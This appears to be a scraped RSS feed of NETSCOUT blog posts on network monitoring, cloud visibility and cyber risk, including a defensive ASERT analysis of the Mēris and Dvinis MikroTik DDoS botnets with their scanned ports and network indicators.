<p>Although this mix-and-match UCaaS scenario is great for users, it does add complexity for IT teams that require visibility and real-time monitoring of these platforms, whether employees are in work-from-home locations, remote offices, onsite and cloud-based call centers, or headquarters facilities. With the extended business hours so prevalent in the COVID-19 pandemic era, many employees shift across multiple locations on a daily basis and expect their UCaaS of choice to perform reliably across all their working environments.</p>

<p>Amid these technology delivery variables, points of consistency remain: To assure reliable UCaaS performance, service edge visibility and vendor-neutral performance analytics are required. More specifically, the key performance indicators used to monitor voice and video quality are consistent across UCaaS, regardless of the vendor technology employed. A smart visibility approach is essential for providing IT operators with hop-by-hop analysis so they can differentiate a UCaaS technology shortfall from an issue relating to a SIP gateway, network, remote VPN, or Wi-Fi access point.</p>

  <title>NETSCOUT CIO Presents at Wall Street Journal CIO Summit</title>
  <link>http://localhost:7996/blog/netscout-cio-presents-wall-street-journal-cio-summit</link>
  <description>NETSCOUT’s CIO Thor Wallace presented “Modern IT: NETSCOUT’s Digital Transformation” at a recent Wall Street Journal CIO Summit.</description>
  <content:encoded><![CDATA[<p><a href="https://www.netscout.com/company/executive-team/thor-wallace">Thor Wallace, senior vice president and CIO of NETSCOUT</a>, presented “Modern IT: NETSCOUT’s Digital Transformation” at the&nbsp;<a href="https://cionetwork.wsj.com/event/cio-network-summit/?mod=CION_find_out_more"><em>Wall Street Journal</em> CIO Network Summit</a> Sept 21, 2021. In his presentation, Wallace described how NETSCOUT has modernized our internal IT infrastructure over the last three years. He noted that early on in their planning process, NETSCOUT IT identified agility as the key to accomplishing the company’s current goals and to achieving future success. “Agility isn’t simply the ability to go fast but also the ability to <em>adjust</em> quickly,” Wallace said, describing how the IT organization went on to determine how changing technology or changing the organization or some combination of both would allow them to be agile.</p>

<p><strong>Bringing Agility to People, Process, and Technology</strong></p>

<p>People changes at NETSCOUT IT, Wallace said, included training, cross-training, and new job descriptions; process changes included incorporating Agile methodology, cross-functional teams, and continuous delivery of services; and technology changes included a shift from on-premises hardware to cloud-based software, positioning the IT organization for future challenges and opportunities.</p>

<p><strong>Eliminating Silos</strong></p>

<p>When discussing the organizational and process roadmap, Wallace also stressed the importance of eliminating silos in the IT organization and instead forming collaborative teams capable of meeting the demands of broadly scoped projects. “If you move into the cloud space, for example, that is a multidisciplinary project,” he said. “You must have at the table networking people who understand networking, obviously, applications people, and infrastructure people all working on the same problem. If you don't have everyone in the same place, you can really open yourself up for risk.”</p>

<p><strong>Standardizing Across Domains</strong></p>

<p>Wallace also shared NETSCOUT’s IT performance roadmap, showing its start as a strictly support function and its final-state goal as an agile department fully integrated into the entire business. When discussing how NETSCOUT meets and plans for these goals, he outlined an improved and standardized project lifecycle management process that bakes in architecture as one of its stages. He noted that as IT reviewed project requirements for this digital transformation, the team chose one standard for any system that varied across NETSCOUT “We’re a company of three major legacy companies,” Wallace explained. “NETSCOUT IT is a rollup of various other organizations.… For example, we had three domain name systems. So why don't we standardize on one?”</p>

<p><strong>&nbsp;Ensuring Reliability and Security via Visibility</strong></p>

<p>Wallace noted that in moving to <a href="https://www.netscout.com/blog/ensuring-cloud-migration-success">cloud-based applications and systems</a>, IT organizations must show improvement from their legacy systems as well as continuous reliability. Wallace encouraged viewers to consider whether they have the “…data and the capabilities to understand what's working and what's not working in a very quick way.” In highly distributed environments, he pointed out, IT organizations need visibility to and control of their entire network to find and diagnose any problems. “Visibility is fundamental to ensuring smooth operations and meeting user experience requirements during and after digital transformation involving foundational changes,” he said, emphasizing the importance of <a href="https://www.netscout.com/solutions/smart-edge-monitoring">edge visibility</a>, not just for network performance, but network security as well.</p>

  <title>A Tale of Two Botnets</title>
  <link>http://localhost:7996/blog/asert/tale-two-botnets</link>
  <description>NETSCOUT's ASERT Team tracks Mēris and Dvinis DDoS Botnets. The blog covers the number of botted nodes observed, how they are propagating, and where they are distributed geographically. We also disclose characteristics of the bots and how to recognize them on a network.</description>
  <content:encoded><![CDATA[<h1>Executive Summary</h1>

<p>In June of 2021, a new botnet comprised of unpatched MikroTik routers emerged. Dubbed <em>Mēris</em> by security researchers who first reported it, this IoT botnet launched numerous application-layer HTTP and HTTP/S DDoS attacks against multiple targets worldwide, including Krebs On Security and Yandex. By some accounts, there are ~250,000 unpatched MikroTik routers worldwide which can potentially be compromised and incorporated into DDoS-capable botnets like <em>Mēris</em>. </p>

<p>Based on an analysis of identifiable botted MikroTik routers leveraged to launch DDoS attacks during the last four months, it appears that there are in fact at least two distinct MikroTik-based IoT botnets involved in these attacks. We have dubbed the second botnet <em>Dvinis</em>, which means ‘twin’ in Latvian (<em>Mēris</em> is Latvian for plague). The main difference between these is the use of HTTP Pipelining as a form of attack. <em>Mēris</em> leverages this attack method, while <em>Dvinis</em> does not.</p>

<h1>Key Findings</h1>

<ul><li>There are at least two DDoS-capable IoT botnets, <em>Mēris</em> and <em>Dvinis</em>, inhabiting the same population of unpatched, exploitable MikroTik routers.</li>
	<li>Since August of 2021, we observed multiple HTTP and HTTP/S application-layer DDoS attacks launched by <em>Mēris</em> and <em>Dvinis</em>, and assisted network operators in successfully mitigating these attacks.</li>
	<li>Both botnets are actively attempting propagation to expand and to date we are tracking approximately 4,800 <em>Mēris</em> and 3,500 <em>Dvinis</em> botted nodes.</li>
</ul><p><em><strong>NOTE:</strong> NETSCOUT Arbor DDoS defense solutions can be used to detect, classify, traceback, and mitigate DDoS attacks launched by these botnets.</em></p>

<h1>Overview</h1>

<p>In mid-2018, a vulnerability targeting the WinBox service of network vendor MikroTik’s RouterOS was discovered, CVE-2018-14847. This vulnerability affected MikroTik RouterOS through version 6.42, permitting unauthenticated remote attackers to remotely read and write files via a directory traversal vulnerability in routers’ WinBox interface. This allowed adversaries to extract admin passwords, create option packages that enabled developer backdoors, and then further allowed post-exploitation Telnet/SSH root user developmental access with administrative credentials.</p>

<p>While MikroTik patched these vulnerabilities soon after they were discovered and urged all their customers to upgrade to fixed versions of their software, a large population of these routers are still susceptible to intrusion because they have never been patched or were patched while still leaving remote administration mechanisms open to the Internet and without changing the credentials for administrative accounts. </p>

<p>A substantial number of these vulnerable MikroTik routers have been compromised and subsumed into the <em>Mēris</em> IoT botnet. The botnet has been used by attackers to launch multiple high-profile HTTP and HTTP/S DDoS attacks mainly targeting organizations in Central and Eastern Europe. <em>Mēris</em> has also been used in DDoS attacks against Russian networking conglomerate Yandex, as well as prominent security researcher Brian Krebs and his website Krebs on Security, who is well-known for his investigation of online criminal activities worldwide — including Russia and the Baltic states.</p>

<p><em>Mēris</em> has been heavily publicized, and some security analysts initially assumed that all ~250,000 vulnerable devices were part of a single, massive botnet. However, after analyzing numerous DDoS attacks purportedly sourced from the <em>Mēris</em> botnet, assisting network operators to successfully mitigate many of these same DDoS attacks, and developing a methodology to identify and classify compromised MikroTik routers, we’ve been able to determine that the actual numbers of botted IoT devices is considerably fewer than 250,000, and that there are in fact at least two distinct MikroTik-based IoT botnets being used to launch HTTP and HTTP/S application-layer DDoS attacks.</p>

<p>Due to public reporting alleging that the <em>Mēris</em> botnet had been used to launch the largest DDoS attack on record, some organizations targeted by HTTP and HTTP/S DDoS attacks have initially assumed they were being targeted by <em>Mēris</em>, when in reality they were being attacked by <em>Dvinis</em>, or another botnet altogether. In fact, <em>Mēris</em> only accounts for a quarter of DDoS attacks we’ve observed being launched from compromised MikroTik devices. The remaining 75% of these attacks have actually been sourced from <em>Dvinis</em>.</p>

<p>The increased prevalence of DDoS-capable IoT botnets like <em>Mēris</em> and <em>Dvinis</em> is associated with a significant uptick in direct-path DDoS attacks ASERT has observed over the last several months. While this style of DDoS attacks has never completely vanished, the vast majority of DDoS attacks we’ve observed over the last several years have been various types of reflection/amplification attacks, in which the attacker spoofs the IP address of the intended target and induces various abusable services to issue large, unsolicited responses directed towards the targeted network.  </p>

<p>There are likely multiple reasons for the recent increase in direct-path DDoS attacks, but one salient factor may be a renewed emphasis on implementing source-address validation (SAV) by network operators in order to disallow spoofed packets from ingressing or egressing their networks. Without the ability to spoof the IP addresses of their intended targets, attackers can’t launch reflection/amplification attacks, which can range in size from a few Gbps up to the very largest terabit-class DDoS attacks. Broader implementation of SAV is bad news for the criminal operators of spoofing-capable DDoS attack infrastructure, and we encourage all network operators to work on implementing SAV as broadly across their network edges as possible. More information on SAV and other network infrastructure best current practices (BCPs) can be found here (<a href="https://www.manrs.org">https://www.manrs.org</a>).</p>

<h2>Mēris Botnet Analysis</h2>

<p>We’ve been tracking <em>Mēris</em> botnet activities since August of 2021. NETSCOUT’s ATLAS Global DDoS attack telemetry revealed ~4800 <em>Mēris</em> nodes participating in numerous DDoS attacks. Our global honeypot network also observed multiple connections from 103 separate <em>Mēris</em> botnet nodes attempting to compromise and subsume additional vulnerable MikroTik devices into the botnet. </p>

<p><em>Mēris</em> propagation scans for the following open ports:</p>

<ul><li>TCP/80 </li>
	<li>TCP/8080</li>
	<li>TCP/3389 </li>
	<li>UDP/123 </li>
	<li>UDP/389 </li>
	<li>UDP/1121 (the UDP ports are related to UDP reflection/amplification vectors). </li>
</ul><p>The compromised MikroTik router infected with <em>Mēris</em> attempts to use the cited remote exploit on TCP/8291 as well as brute-force credentials over Telnet and SSH.<br /><em>Mēris</em> compromised devices exhibit the following characteristics:</p>

<ul><li>Utilize HTTP Pipelining</li>
	<li>TCP/2000 open - reports as Bandwidth test server and responds with a “SERVER HELLO” once a TCP 3-way handshake is complete.</li>
	<li>TCP/5678 open - reports as MikroTik Neighbor Discovery Protocol (MNDP)</li>
</ul><p>To date, <em>Mēris</em> nodes have only been observed launching HTTP and HTTP/S application-layer DDos attacks, principally targeting Web servers with HTTP GET and POST request-floods. Many of these attacks — possibly all of them — are actually initiated by external attack harnesses under the control of the attackers, and are then relayed through <em>Mēris</em> bots via the SOCKS4/5 services present on the compromised MikroTik devices.  </p>

<p><em>Mēris</em> HTTP and HTTP/S DDoS attacks are somewhat unusual due to the incorporation of HTTP pipelining in the synthesized HTTP attack traffic. HTTP pipelining was intended to allow persistent TCP connections to be used to issue multiple successive HTTP/1.1 requests; however, it has been deprecated in almost all current Web browsers, and most Web servers do not support it.   </p>

<p>An extensive set of some ~600 credentials are in use across the <em>Mēris</em> botnets. They are all easily brute-forced, and do not present a barrier to automated compromise techniques.</p>

<p>While there are <em>Mēris</em> nodes present in many geographies, we’ve observed significant concentrations in Central and Eastern Europe, South America, Southeast Asia, Northeast Asia, and the Indian subcontinent (<strong>Figure 1</strong>). </p>
<figure role="group" class="caption caption-img align-center"><img alt="Meris Botnet Distribution" data-entity-type="file" data-entity-uuid="2572342b-f33d-4710-b864-32c5e9d71b1d" src="http://localhost:7996/sites/default/files/inline-images/Meris%20Figre%20One.png" /><figcaption><em>Figure 1: Mēris Botnet Distribution</em></figcaption></figure><p><br />
The distribution of the botnet has higher concentration in some cities, though this isn’t indicative of adversaries choosing a city to establish nodes, but rather a global popularity in MikroTik routers: </p>

<ul><li>Brazil (Recife, Sao Paulo, Rio de Janeiro, Belo Horizonte)</li>
	<li>Indonesia (Jakarta)</li>
	<li>China (Shanghai, Beijing, Zhuhai, Tonghua, Guangzhou)</li>
</ul><p><em>Dvinis</em> Botnet Details</p>

<p>The <em>Dvinis</em> botnet is very similar to the <em>Mēris</em> botnet described above. It also consists of compromised MikroTik routers and is also used to launch HTTP and HTTP/S application-layer DDoS attacks. To date, we’ve observed ~3500 <em>Dvinis</em> nodes participating in DDoS attacks worldwide.</p>

<p>Unlike <em>Mēris</em>, <em>Dvinis</em> sourced HTTP and HTTP/S application-layer DDoS attacks don’t appear to make use of HTTP pipelining; however, an apparent typo in the attack generators appends an extra ‘/’ character to the end of the URIs targeted in HTTP POST and GET floods. It also appears that, as with <em>Mēris</em>, most, if not all of the observed HTTP and HTTP/S DDoS attacks sourced from Dvinis are also actually initiated by external attack harnesses and relayed via the SOCKS4/5 proxy subsystem built into the compromised MikroTik routers. The HTTP X-Forwarded-For field in captured attack packets includes the source IP addresses of the actual attack infrastructure being used to generate these attacks.</p>

<p><em>Dvinis</em> compromised devices exhibit the following characteristics:</p>

<ul><li>TCP/2000 open - reports as Bandwidth test server and responds with a “SERVER HELLO” once a TCP 3-way handshake is complete.</li>
	<li>TCP/8291 open</li>
	<li>HTTP Post and GET Requests included a double slash (//) in the URI</li>
</ul><p>We observed at least 50 of the ~3500 <em>Dvinis</em> bots attempt propagation to one of our honeypots. Propagation starts with a scan for the following open ports:</p>

<ul><li>TCP/80 </li>
	<li>TCP/8080 </li>
	<li>TCP/555 </li>
	<li>UDP/123 </li>
	<li>UDP/389 </li>
	<li>UDP/3702 </li>
	<li>UDP/5060</li>
	<li>UDP/11211 (as with <em>Mēris</em>, the UDP ports are associated with UDP reflection/amplification DDoS vectors, but includes some not scanned for by <em>Mēris</em>). </li>
</ul><p><em>Dvinis</em> brute-force propagation uses ~400 credential sets; some overlap with those used by <em>Mēris</em>, while others are unique to <em>Dvinis</em>.</p>

<p>We’ve found the largest concentration of <em>Dvinis</em> bots in Eastern Europe, Southeast Asia, and South America (<strong>Figure 2</strong>). As with Mēris, they’re distributed on a number of networks in those regions and are primarily concentrated in large cities.</p>

<ul><li>Indonesia (Jakarta)</li>
	<li>Russia (Moscow)</li>
	<li>Brazil (Sao Paulo, Rio De Janeiro, Salvador)</li>
</ul><figure role="group" class="caption caption-img align-center"><img alt="Dvinis Botnet Distribution" data-entity-type="file" data-entity-uuid="efff4e49-e1f8-43c5-8882-dca5f77e80b8" src="http://localhost:7996/sites/default/files/inline-images/Dvinis%20Figure%20Two.png" /><figcaption>Figure 2: <em>Dvinis</em> Botnet Distribution</figcaption></figure><h1>Conclusion</h1>

<p>The rise of the <em>Mēris</em> and <em>Dvinis</em> IoT DDoS botnets almost certainly could’ve been prevented by operators of MikroTik routers ensuring their devices were kept up-to-date with security patches, as well as by implementing good password hygiene. These are issues we see time and time again in these cases.</p>

<p>These botnets essentially ‘rose from the dead’ thanks to an old exploit which enabled adversaries to build out not one, but at least two DDoS-capable IoT botnets. The good news is that the DDoS attacks launched by both botnets can be mitigated by implementing relevant BCPs; developing, updating, and rehearsing a comprehensive DDoS mitigation plan; and deploying an intelligent DDoS mitigation system (IDMS) such as NETSCOUT Arbor <a href="https://www.netscout.com/product/netscout-aed">AED</a> and NETSCOUT Arbor <a href="https://www.netscout.com/product/arbor-sightline">Sightline</a>/<a href="https://www.netscout.com/product/arbor-sightline">TMS</a></p>

  <title>Is IT Troubleshooting and Maintenance Sapping All Your Time?</title>
  <link>http://localhost:7996/blog/it-troubleshooting-and-maintenance-sapping-all-your-time</link>
  <description>A round-the-clock proactive monitoring managed service offers IT a “hands free” way to monitor, service-triage, and gain critical data insights into business, industry, voice, video, and SaaS application performance issues.</description>
  <content:encoded><![CDATA[<p>Ask any IT team, and they’ll tell you they have their hands full. Troubleshooting and maintenance responsibilities tend to suck up just about every minute of IT’s time, leaving little bandwidth for pursuing critically important corporate initiatives. A recent <a href="https://vmblog.com/archive/2019/03/22/is-it-spending-too-much-time-troubleshooting-the-network-new-survey-suggests-yes.aspx#.YUtwAH1lA2w">study</a> found that 42 percent of IT professionals spent too much time troubleshooting the network, and that 43 percent struggled to find time to work on strategic business initiatives.</p>

<p>Another <a href="https://www.inap.com/blog/monitoring-os-maintenance-it-infrastructure-time-wasters/">report</a> found that “59 percent of IT pros were frustrated by the time spent on routine infrastructure activities and 84 percent agreed that they could bring more value to their organization if they spent less time on routine tasks.”</p>

<p>Because IT teams tend to be reactive to network problems, they are then unable to fully focus on digital transformation initiatives, data center conversions, and other revenue-benefiting projects. This is where NETSCOUT Visibility as a Service (VaaS) presents a distinct advantage for IT.</p>

<p><strong>Reducing Burden on IT Staff </strong></p>

<p>A round-the-clock, proactive-monitoring managed service offers IT a “hands free” way to monitor, service triage, and gain critical data insights into business, industry, voice, video, and software-as-as-service (SaaS) application performance issues. VaaS can enable IT to more easily manage complex, multivendor network environments, including private data centers, co-locations, public cloud, remote offices, and wide-area networks (WANs).</p>

<p>NETSCOUT VaaS is an ideal way to reduce the burden on IT staff, offloading some of the more mundane responsibilities of managing and monitoring an organization’s infrastructure. Relieving IT professionals of these day-in and day-out troubleshooting responsibilities frees them to focus on more strategic tasks, while still being available to step in when there’s an exception or an accelerated tier-three type of problem that requires their immediate attention&nbsp;</p>

<p><strong>IT Focus on Strategic Initiatives </strong></p>

<p>When IT teams are unburdened of the constant pressure to monitor and troubleshoot, they are able to redirect time and resources to value-added projects for the business. Such projects might include implementing digital transformation efforts to speed order processing, or launching new business applications that drive efficiency and reach new audiences that can grow revenue. Another example might be IT focusing on the development of mobile applications that support sales or improve internal operations. In short, the possibilities VaaS can deliver, enabling IT to support new technology initiatives that create a competitive advantage for the business, are endless.&nbsp;</p>

<p>Another benefit of VaaS, and its ability to reduce the strain IT faces in dealing with myriad problems and constant complaints, is the impact on IT professionals themselves. By freeing them up, VaaS enables these pros to do rewarding work on new projects, rather than the drudgery of continuous troubleshooting. As a result, job satisfaction tends to go up and employee turnover goes down.</p>

<p><strong>VaaS Expertise from the Monitoring Experts</strong></p>

<p>NETSCOUT’s VaaS solution can help cut mean time to knowledge (MTTK) and speed up mean time to repair (MTTR). NETSCOUT brings its expertise and best practices to deliver a VaaS solution that provides deep analysis and actionable recommendations. NETSCOUT’S VaaS is ideal when working with NETSCOUT products, such as nGeniusONE, InfiniStreamNG, nGeniusPULSE, nPoints, nGenius Packet Flow Switches, Omnis Cyber Investigator, and Smart Edge Monitoring solutions. Regardless of the industry, outsourcing service assurance is a smart move for any IT organization.</p>

<p>According to one online hospitality/travel enterprise, “The NETSCOUT team would work with us to dig into issues we’re seeing at a site and helped us troubleshoot those issues until we found a resolution.”</p>

  <content:encoded><![CDATA[<p>As an Amazon Web Services (AWS) Advanced Technology Partner, NETSCOUT helps organizations gain the visibility they need to deliver advanced application troubleshooting based on a unique set of user experience metrics not typically available with existing tools.</p>

<p>These metrics, combined with the NETSCOUT nGeniusONE platform, provide visibility across complex interconnected hybrid AWS deployments and deliver common troubleshooting and performance analysis workflows to help companies streamline cloud migration initiatives with AWS “certified” success as part of the AWS Networking and Migration Competency programs. Our Smart Data technology, which is used by many Global 2000 enterprises and Tier 1 communications service providers (CSPs), helps network operations and security operations professionals deliver high-quality application performance and improve enterprise security across on-premises data centers and AWS cloud infrastructure.</p>

<p>By monitoring and capturing packet data traversing cloud environments and performing simultaneous deep-packet inspection and real-time analysis, NETSCOUT’s vSTREAM virtual appliance generates Smart Data at its point of collection. This Smart Data delivers a comprehensive view into the performance characteristics of all infrastructure and application components and their dependencies.</p>

<p>Since Smart Data is generated by processing and analyzing packet data, it is important to develop a packet acquisition strategy across hybrid cloud environments, particularly considering several factors driving increased traffic volumes in AWS virtual private clouds (VPCs).</p>

<p>The adoption of new microservices architectures increases traffic volumes in server farms or clusters of compute and application workloads in AWS VPCs. As enterprises and CSPs scale their deployments in AWS and across hybrid cloud environments, an increasing volume of traffic traverses VPC boundaries as well as traversing within VPCs. This trend is driven by accelerated workload migration to the cloud, which leads to frequent changes in service architectures.</p>

<p><strong>Amazon VPC Routing</strong><strong>Enhancements </strong></p>

<p>AWS’s recently announced VPC routing enhancements make it easy for customers to route traffic between two subnets in a VPC via virtual functions. This enhancement combined with Amazon VPC Traffic Mirroring allows NETSCOUT to effectively acquire traffic that traverses VPC boundaries and subnets within VPCs and route it to <a href="https://www.netscout.com/product/vstream">vSTREAM</a> appliances for real-time analysis for service and security assurance.</p>

<p>With capabilities such as service chaining for inserting security devices between VPC subnets, these routing enhancements help customers broaden the deployment options for integrating network and security appliances within their network topology.</p>

<p>This provides customers more flexibility, making it easier for them to deploy production-grade applications with the networking and security services they require within their Amazon VPC.</p>

<p>Of course, with this flexibility and improved security posture comes even deeper and more pervasive monitoring. In conjunction with VPC Traffic Mirroring, NETSCOUT <a href="https://www.netscout.com/product/vstream">vSTREAM</a> delivers advanced service performance and security assurance. This approach complements NETSCOUT’s embedded virtual appliances, which offer software-based instrumentation of application workloads.</p>

<p>NETSCOUT harnesses the new acquisition capabilities of both intra- and inter-VPC traffic in AWS to effectively deliver visibility without borders across on-premises data centers, cloud, and hybrid cloud. This includes visibility into applications and their dependencies and actionable intelligence necessary to assure end-to-end service performance and cybersecurity. With this visibility, enterprises and CSPs can effectively migrate their business applications to AWS and create connections to AWS Direct Connect.</p>

  <title>Lessons from the Pandemic: A New Urgency for NetOps-SecOps Alignment</title>
  <link>http://localhost:7996/blog/urgency-netops-secops-alignment</link>
  <description>When the pandemic pushed enterprise networks to evolve rapidly to serve increased users with increased services, security threats evolved too. NetOps and SecOps teams need to work together more effectively than ever.</description>
  <content:encoded><![CDATA[<p>As the COVID-19 pandemic pushed enterprise networks to evolve rapidly to serve increased user populations with increased services, network security threats evolved in response. Multiple and diverse network endpoints invite multiple bad actors to invade your network, which is why network operations (NetOps) and network security operations (SecOps) teams need a way to work together more quickly and effectively than ever before.</p>

<p>During a recent NETSCOUT OnGuard webinar, a panel of industry experts discussed this rapid digital transformation of enterprise networks and how <a href="https://www.netscout.com/blog/netops-secops-improve-security">NetOps and SecOps can join forces for faster, more decisive network issue assessment</a>.</p>

<p>When discussing the expanded services and demands on enterprise networks, Hardik Modi, associate vice president for NETSCOUT’s threat, intelligence, and mitigation products, noted that “from a security standpoint, maintaining the availability, integrity, and confidentiality (CIA) of all services became that much harder to ensure.” And enterprise organizations will always need to be focused on all three aspects of the CIA cybersecurity triad.</p>

<h3>Total Network Visibility: A Common Need Can Be Commonly Sourced</h3>

<p>Total network visibility is important to NetOps for <a href="https://www.netscout.com/blog/genie-out-bottle-business-continuity-locked-down-world">service assurance</a> and to SecOps for <a href="https://www.netscout.com/what-is/difference-between-threat-intelligence-and-cybersecurity">cybersecurity</a>, and these teams can collaborate more powerfully by using a common source of network-derived data—something that Mark Doering, director of technical marketing for NETSCOUT, referred to as a “single source of truth.” Doering went on to say that if these teams “…don’t have the same formulated data pattern, collection capabilities, or depth of visibility, or the same point of visibility in their network, then they’re going to derive different answers to the same questions.” Using the same <a href="https://www.netscout.com/blog/making-analytics-smarter">smart data</a> source allows for more efficient troubleshooting from both sides of the organization and eliminates that sort of crossfire and duplication of effort.</p>

<h3>Endpoint Detection Versus Whole-Network Detection</h3>

<p>Tom Bienkowski, director of product marketing for NETSCOUT, noted that security teams have additional methods for deriving visibility for cybersecurity purposes, including endpoint detection and response (EDR) solutions. Although EDR (and firewall, and <a href="https://www.netscout.com/solutions/omnis-smart-edge-protection">edge defense</a>) tools are all important parts of any network defense strategy, they should not be the only defense. As Modi commented, “Knowing that you have complete coverage with your EDR solution in itself is a challenge.”</p>

<p>Today, malware is increasingly targeting the BIOS, where it is difficult to detect, and it’s being found on other network devices, including Internet of Things (IoT) devices, where it is increasingly difficult to deploy EDR solutions. But as Doering noted, “Network-derived data is hard to manipulate and hard to obfuscate. The network usually gives you that better point of truth.” So, having network-derived data is key for enterprise network security.</p>

<h3>You’ve Got Total Network Visibility. Now What?</h3>

<p>Every enterprise can benefit from the streamlined workflows and decreased mean time to recovery (MTTR) that results when NetOps and SecOps teams share the same source of network-derived data. Businesses can also go on the offensive when it comes to threats—they can go threat hunting.</p>

<p>“Being able to retrieve information from a security and event management/security orchestration, automation, and response (<a href="https://www.netscout.com/what-is/siem">SIEM</a>/SOAR) solution is different than saying, ‘I have an endpoint reporting, or I have a network reporting,’” Doering said. “You’re going after a data set, or event, or set of events.” It could be a list of events, he added, because many are tying the newer EDRs to things such as <a href="https://www.mitre.org/publications/project-stories/d3fend-knowledge-graph-guides-security-architects-better-cyber-defenses#:~:text=That's%20why%20MITRE%20worked%20to,the%20cybersecurity%20of%20national%20security">MITRE D3FEND</a> and are able to <a href="https://www.netscout.com/product/cyber-intelligence">drill into the exposed event</a>. “And whether it be the applications or the security infrastructure, a smart data solution brings that all together naturally for NetOps and SecOps—from packets, to security events, to application-level awareness.” Regardless the security layer, be it layer 3 up to layer 7, Doering emphasized, you’re going to need that visibility across the entire network infrastructure.</p>

  <title>3 Aspects to Managing Systemic Cyber Risk</title>
  <link>http://localhost:7996/blog/3-aspects-managing-systemic-cyber-risk</link>
  <description>Learn about the three aspects to managing systemic cyber risk that are required for the preservation of a digital ecosystem</description>
  <content:encoded><![CDATA[<p><em>Authored by&nbsp;Michael Daniel, President &amp; CEO of the Cyber Threat Alliance</em></p>

<p>Cyberspace enables connections, whether between individuals, organizations, governments, or some combination of the three. In fact, one can argue that enabling simple, fast, and reliable connections over vast distances and at enormous scales is the key feature of cyberspace that makes it so revolutionary. Such connections have allowed individuals, organizations, and governments to conduct business, manage activities, and deliver services at an unprecedented speed, scope, and scale. Through the network effect, these connections have enabled a handful of hardware, software, and protocol systems to become almost ubiquitous. Easy, reliable connections have permitted certain platforms, like cloud service providers, to grow to extraordinary sizes and become indispensable to thousands of organizations. Finally, these easy, rapid connections have allowed us to extend the trust and confidence usually reserved for in-person relationships across great distances and at large scales.</p>

<p>Thus, the rapid, easy, connection-creating capability of the Internet and cyberspace has made individuals, for-profit companies, non-profit organizations, and government agencies reliant on each other to an unprecedented degree. Most of the time, this system works sufficiently well to generate huge benefits to society. However, this cross-cutting reliance also has a downside. Each of those features described above creates systemic risk. Common hardware, software, or protocols; common service providers; functional interdependencies; and the criticality of trust and confidence mean that risk flows throughout cyberspace along with the connections. In such a complex, interdependent system, a disruption to one element can negatively affect almost any element, often in unexpected ways or through unforeseen pathways.&nbsp;</p>

<p>However, systemic risk means that negative effects go beyond unexpected connections. An incident in a private sector element can negatively affect our overall national security, economic prosperity, or public health and safety. Ransomware attacks have provided us some of the starkest examples. For instance, an ostensible ransomware attack on the Ukrainian government in 2017 (NotPetya) spread far beyond the original target set to the global transportation system, due to the required use of a common piece of software (a tax payment system). The May 2021 ransomware attack on Colonial Pipeline’s business IT systems caused the company to shut down the operating technology infrastructure, thereby slowing oil and gasoline distribution to the US East Coast; in turn, this slowed distribution resulted in panic buying of gasoline that created a self-fulfilling shortage. The inability to fill a gas tank was not because the ransomware shut down the pipeline (it didn’t), but because a breakdown in trust and confidence at a distance occurred, similar to a run on a bank in the financial sector.&nbsp;</p>

<p>While we are still grappling with the full implications of the systemic risks generated through cyberspace, we have already learned a few lessons. If attacks on a private sector entity can affect our national security or general public health and safety, then cybersecurity becomes not just one organization’s responsibility, but a collective responsibility. Yet, since cyber risk is systemic and flows through these interconnected pathways, even the US Federal government cannot manage this risk on its own. Merely understanding how risk could manifest requires interagency, cross-sectoral, public-private discussions to ensure that all the relevant connections and effects are taken into account – let alone deciding the right level of risk to accept or how to manage it. Consequently, managing systemic cyber risk in such an environment requires us as a society to apply new structures, policies, and tools to the problem.&nbsp;</p>

<p>What would such structures, policies, and tools look like? While we are still developing the answer to this question, at least three aspects of an effective response have already emerged:</p>

<p><em>Heterogeneous participants </em>– managing the risk from terrorism is a government activity in which the private sector does not play a significant role. On the flip side, managing brand reputation risk is a private sector affair which generally does not involve the government. For the reasons laid out above, however, managing systemic cyber risk is different. Government has a role driven by the national security and law enforcement aspects of the problem. The private sector plays a role because it owns most of the infrastructure either at risk or used to carry out activities. Civil society and non-profit groups also have capabilities that governments lack but that can be critical to a response. Thus, the number, type, background, context, and capability of the participants in cyber risk management efforts will vary extensively, far beyond what is required to address most other types of risk.&nbsp;</p>

<p><em>Operational Collaboration</em> – as the name implies, this concept has two parts. First, the “operational” part goes beyond sharing information or even division of labor; it means synchronizing <u>actions</u> or operations in space and time to amplify effects on our adversaries. Second, the “collaboration” part means multiple types of entities working together. Further, participating entities can come from multiple parts of the ecosystem depending on the situation. Making operational collaboration effective will require new policies, laws, and regulations.&nbsp;</p>

<p><em>New relationship types</em> – the relationships between the entities involved in operational collaboration will not be traditional. For example, the government is normally either a regulator, buyer, or enforcer with respect to the private sector, but in this situation, it is a peer. Private sector companies often establish structured, contractual relationships with each other, but in these conditions, time may not be sufficient. Nor will these relationships always persist indefinitely. Certain collaborations will become permanent (like the Cyber Threat Alliance, a standing association of cybersecurity providers), while others will form to address a specific situation then disband. More informal, fluid, and less hierarchal relationships will often form the basis for this work – just like other kinds of work in the digital age.&nbsp;</p>

<p>Creating effective policies, structures, and tools to manage our systemic cyber risk forms one of the most important cybersecurity challenges we will face for the next decade. If we are not able to develop these capabilities, then not only will we forgo potential future benefits that could flow from the digital ecosystem, but we will also lose some of the benefits we currently have as people and organizations pull back from the on-line world. That’s not a future any of us want. Therefore, as we head into the second half of Cybersecurity Awareness Month, think about the role you can play in addressing our systemic cyber risk. After all, since we’re all connected, everyone can contribute to the answer.&nbsp;</p>

  <title>High-Profile DDoS Extortion Attacks Against SIP/RTP VoIP Providers</title>
  <link>http://localhost:7996/blog/asert/high-profile-ddos-extortion-attacks-against-siprtp-voip</link>
  <description>Beginning in September 2021, aggressive threat actors have targeted multiple Voice-over-IP (VoIP) communication providers with a campaign of high-impact DDoS extortion attack</description>
  <content:encoded><![CDATA[<h1>ASERT Threat Summary</h1>

<p><strong>Date</strong>:&nbsp;October 22nd, 2021<br />
<strong>Severity</strong>:&nbsp;Informational.<br />
<strong>Distribution</strong>:&nbsp;TLP: <a href="https://www.us-cert.gov/tlp">WHITE</a><br />
<strong>Categories</strong>:&nbsp;Availability<br />
<strong>Contributors</strong>:&nbsp;Bill McDonough, Bill Cerveny, Tony Scheid.</p>

<h2>Executive Summary</h2>

<p>Beginning in September 2021, aggressive threat actors have targeted multiple Voice-over-IP (VoIP) communication providers with a campaign of high-impact DDoS extortion attacks. These attacks incorporate a range of UDP reflection/amplification and application-level DDoS attack vectors which have disrupted VoIP services for organizations unprepared to mitigate the attacks.&nbsp; In many cases, adversaries attempted to pressure targeted organizations into making crypto-currency extortion payments in exchange for ceasing the attacks.&nbsp; This Threat Summary includes recommendations for successfully mitigating these attacks.</p>

<h2>Key Findings</h2>

<ul>
